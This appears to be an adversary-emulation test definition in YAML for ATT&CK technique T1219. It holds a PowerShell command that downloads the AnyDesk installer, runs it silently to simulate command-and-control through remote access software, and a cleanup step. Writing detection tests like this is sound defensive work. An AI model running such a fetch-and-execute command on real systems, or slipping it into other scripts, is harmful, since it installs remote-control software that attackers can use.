- id: b5e94bd5-fe86-5d83-ade0-8ca33ecfd047
  name: Soumaia ART Tests - AnyDesk Files Detected Test on Windows
  description: An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed. (requires elevation)
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: Remote Access Software
  platforms:
    windows:
      psh:
        command: |-
          Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
          Start-Process $file1 /S;
        cleanup: |-
          $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
          Remove-Item $file1 -ErrorAction Ignore
